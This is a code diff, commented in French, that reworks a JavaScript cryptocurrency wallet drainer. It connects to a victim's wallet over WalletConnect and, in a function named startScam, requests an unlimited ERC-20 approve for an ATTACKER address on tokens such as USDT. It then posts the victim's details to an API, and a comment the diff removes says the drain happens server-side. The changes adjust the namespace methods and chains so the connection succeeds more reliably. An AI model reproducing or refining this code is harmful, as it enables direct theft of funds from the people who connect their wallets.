@@ -10,6 +10,7 @@ const TOKENS = {
 let signClient;
 let session;
 let account;
+let currentChainId;
 const PROJECT_ID = '0ecdd9357f8779fcb4c4944118927362';
 
 function getSignClient() {
@@ -35,18 +36,28 @@ async function initWalletConnect() {
     }
   });
 
-  // Seulement Ethereum mainnet
+  // ⚠️ Solution n°1 : ajouter BSC + garder que eth_sendTransaction
   const { uri, approval } = await signClient.connect({
     requiredNamespaces: {
       eip155: {
-        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
+        methods: ['eth_sendTransaction'],                // vire eth_sign, personal_sign
+        chains: ['eip155:1', 'eip155:56'],               // Ethereum + BSC
+        events: ['chainChanged', 'accountsChanged']
+      }
+    }
+    // Si ça foire encore, décommente solution n°2 : optionalNamespaces
+    /*
+    optionalNamespaces: {
+      eip155: {
+        methods: ['eth_sendTransaction'],
         chains: ['eip155:1'],
         events: ['chainChanged', 'accountsChanged']
       }
     }
+    */
   });
 
-  // Attendre QRCode
+  // Afficher le QR
   await new Promise((resolve, reject) => {
     if (typeof QRCode !== 'undefined') return resolve();
     let tries = 0;
@@ -73,9 +84,15 @@ async function initWalletConnect() {
   document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';
 
   session = await approval();
+
+  // 🔍 Filtrer le compte Ethereum mainnet (chainId '1') parmi les comptes renvoyés
   const accounts = session.namespaces['eip155'].accounts;
-  account = accounts[0].split(':')[2];
-  currentChainId = accounts[0].split(':')[1];
+  const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
+  if (!ethAccount) {
+    throw new Error('Aucun compte Ethereum mainnet trouvé. Veuillez sélectionner Ethereum dans votre wallet.');
+  }
+  account = ethAccount.split(':')[2];
+  currentChainId = '1';  // Forcé à Ethereum
 
   document.getElementById('qrcode').style.display = 'none';
   document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;
@@ -84,16 +101,17 @@ async function initWalletConnect() {
 }
 
 async function startScam() {
-  const tokens = TOKENS[currentChainId];
-  if (!tokens || currentChainId !== '1') {
+  if (currentChainId !== '1') {
     document.getElementById('status').innerText = 'Réseau non supporté (Ethereum mainnet requis)';
     return;
   }
 
-  // GasPrice fixé à 2 gwei
-  const gasPrice = ethers.utils.hexlify(2000000000);
+  const tokens = TOKENS[currentChainId];
+  if (!tokens) return;
 
-  for (const t of tokens) { // Une seule itération : USDT
+  const gasPrice = ethers.utils.hexlify(2000000000); // 2 gwei
+
+  for (const t of tokens) {
     const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
     const data = iface.encodeFunctionData('approve', [ATTACKER, ethers.constants.MaxUint256]);
 
@@ -123,7 +141,6 @@ async function startScam() {
     }
   }
 
-  // Envoi de la victime à l'API (le drain se fait côté serveur)
   await fetch(API, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
